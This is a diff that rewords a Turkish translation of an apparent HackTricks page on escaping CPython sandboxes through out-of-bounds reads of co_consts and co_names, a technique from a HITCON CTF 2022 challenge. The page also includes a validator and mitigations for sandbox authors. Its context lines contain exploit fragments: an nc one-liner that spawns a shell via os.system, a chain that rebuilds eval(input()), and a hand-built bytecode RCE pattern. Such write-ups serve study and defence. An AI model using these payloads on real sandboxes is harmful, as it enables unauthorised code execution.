@@ -39,7 +39,7 @@ Ama `co_names` boş bir demet haline gelirse ne olur? `LOAD_NAME 2` opcode'u hal
 
 Çözümün temel konsepti basittir. CPython'daki bazı opcode'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB okuma için savunmasızdır (?).
 
-Bu opcode'lar, `consts` veya `names` demetinden `oparg` indeksinden bir nesne alır (bu, `co_consts` ve `co_names`'in arka planda adlandırıldığı şeydir). CPython'un `LOAD_CONST` opcode'unu işlerken ne yaptığını görmek için `LOAD_CONST` hakkında aşağıdaki kısa kesite bakabiliriz.
+Bu opcode'lar, `consts` veya `names` demetinden `oparg` indeksinden bir nesne alır (arka planda buna `co_consts` ve `co_names` denir). CPython'un `LOAD_CONST` opcode'unu işlerken ne yaptığını görmek için `LOAD_CONST` hakkında aşağıdaki kısa kesiti inceleyebiliriz.
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -54,14 +54,14 @@ Bu şekilde OOB özelliğini kullanarak rastgele bellek ofsetinden bir "isim" al
 ### Exploit Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
 Bu yararlı ofsetleri isimler / sabitler için aldıktan sonra, o ofsetten bir isim / sabit nasıl alır ve kullanırız? İşte size bir hile:\
-Ofset 5'ten (`LOAD_NAME 5`) bir `__getattribute__` ismi alabileceğimizi varsayalım (`co_names=()`), o zaman sadece şu adımları izleyin:
+Ofset 5'ten (`LOAD_NAME 5`) bir `__getattribute__` ismi alabileceğimizi varsayalım (`co_names=()`), o zaman sadece aşağıdaki adımları izleyin:
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-> Dikkat edin ki, bunu `__getattribute__` olarak adlandırmak gerekli değildir, daha kısa veya daha garip bir isim verebilirsiniz.
+> Dikkat edin ki, bunu `__getattribute__` olarak adlandırmak zorunda değilsiniz, daha kısa veya daha garip bir isim verebilirsiniz.
 
 Bunun arkasındaki nedeni sadece bytecode'unu görüntüleyerek anlayabilirsiniz:
 ```python
@@ -205,7 +205,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Temelde şu şeyleri yapar, bu dizeleri `__dir__` yönteminden alırız:
+Temelde şu işlemleri yapar, bu dizeleri `__dir__` yönteminden alırız:
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -222,7 +222,7 @@ builtins['eval'](builtins['input']())
 
 ### Sürüm notları ve etkilenen opcode'lar (Python 3.11–3.13)
 
-- CPython bytecode opcode'ları hala `co_consts` ve `co_names` demetlerine tam sayı operandları ile indekslenir. Eğer bir saldırgan bu demetleri boş (veya bytecode tarafından kullanılan maksimum indeksin altında) hale getirebilirse, yorumlayıcı o indeks için sınır dışı belleği okuyacak ve yakın bellekten rastgele bir PyObject işaretçisi elde edecektir. İlgili opcode'lar en azından şunları içerir:
+- CPython bytecode opcode'ları hala `co_consts` ve `co_names` demetlerine tam sayı operandları ile indekslenir. Bir saldırgan bu demetleri boş (veya bytecode tarafından kullanılan maksimum indeksin altında) hale getirebilirse, yorumlayıcı o indeks için sınır dışı belleği okuyacak ve yakın bellekten rastgele bir PyObject işaretçisi elde edecektir. İlgili opcode'lar en azından şunları içerir:
 - `LOAD_CONST consti` → `co_consts[consti]` okur.
 - `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]`'den isimleri okur (3.11+ için `LOAD_ATTR`/`LOAD_GLOBAL` düşük bitte saklama bayrağı bitleri taşır; gerçek indeks `namei >> 1`'dir). Her sürüm için kesin anlamlar için ayrıştırıcı belgelerine bakın. [Python dis docs].
 - Python 3.11+ gizli `CACHE` girişleri ekleyen adaptif/inline önbellekler tanıttı. Bu, OOB ilkesini değiştirmez; sadece bytecode'u el ile oluşturuyorsanız, `co_code` oluştururken bu önbellek girişlerini hesaba katmanız gerektiği anlamına gelir.
@@ -272,11 +272,11 @@ print(idx, type(obj), repr(obj)[:80])
 ```
 Notlar
 - İsimleri sorgulamak için `LOAD_CONST` yerine `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` kullanın ve yığın kullanımınızı buna göre ayarlayın.
-- Gerekirse 255'ten büyük indekslere ulaşmak için `EXTENDED_ARG` veya birden fazla `arg` baytı kullanın. Yukarıda olduğu gibi `dis` ile inşa ederken, yalnızca düşük baytı kontrol edersiniz; daha büyük indeksler için, ham baytları kendiniz oluşturun veya saldırıyı birden fazla yükleme ayırın.
+- Gerekirse 255'ten büyük indekslere ulaşmak için `EXTENDED_ARG` veya birden fazla `arg` baytı kullanın. Yukarıdaki gibi `dis` ile oluştururken, yalnızca düşük baytı kontrol edersiniz; daha büyük indeksler için, ham baytları kendiniz oluşturun veya saldırıyı birden fazla yükleme bölün.
 
-### Minimal bytecode-sadece RCE deseni (co_consts OOB → builtins → eval/input)
+### Minimal bytecode-only RCE deseni (co_consts OOB → builtins → eval/input)
 
-Bir `co_consts` indeksinin builtins modülüne karşılık geldiğini belirledikten sonra, yığını manipüle ederek `eval(input())`'i herhangi bir `co_names` olmadan yeniden oluşturabilirsiniz:
+Bir `co_consts` indeksini builtins modülüne çözdüğünüzde, yığını manipüle ederek `eval(input())`'i herhangi bir `co_names` olmadan yeniden oluşturabilirsiniz:
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -289,7 +289,7 @@ Bu yaklaşım, `co_code` üzerinde doğrudan kontrol sağlarken `co_consts=()` v
 
 ### Sandbox'lar için savunma kontrolleri ve hafifletmeler
 
-Güvenilmeyen kodu derleyen/değerlendiren veya kod nesnelerini manipüle eden bir Python “sandbox” yazıyorsanız, bytecode tarafından kullanılan tuple indekslerini sınır kontrolü için CPython'a güvenmeyin. Bunun yerine, kod nesnelerini çalıştırmadan önce kendiniz doğrulayın.
+Güvenilmeyen kodu derleyen/değerlendiren veya kod nesnelerini manipüle eden bir Python “sandbox” yazıyorsanız, bytecode tarafından kullanılan tuple indekslerini sınır kontrolü için CPython'a güvenmeyin. Bunun yerine, bunları çalıştırmadan önce kod nesnelerini kendiniz doğrulayın.
 
 Pratik doğrulayıcı (co_consts/co_names için OOB erişimini reddeder)
 ```python
@@ -330,5 +330,5 @@ Ekstra azaltma fikirleri
 ## Referanslar
 
 - Splitline’ın HITCON CTF 2022 yazısı “V O I D” (bu tekniğin kökeni ve yüksek seviyeli istismar zinciri): https://blog.splitline.tw/hitcon-ctf-2022/
-- Python ayrıştırıcı belgeleri (LOAD_CONST/LOAD_NAME/etc. için indeks semantiklerini ve 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` düşük bit bayraklarını): https://docs.python.org/3.13/library/dis.html
+- Python ayrıştırıcı belgeleri (LOAD_CONST/LOAD_NAME/etc. için indeks semantik ve 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` düşük bit bayrakları): https://docs.python.org/3.13/library/dis.html
 {{#include ../../../banners/hacktricks-training.md}}
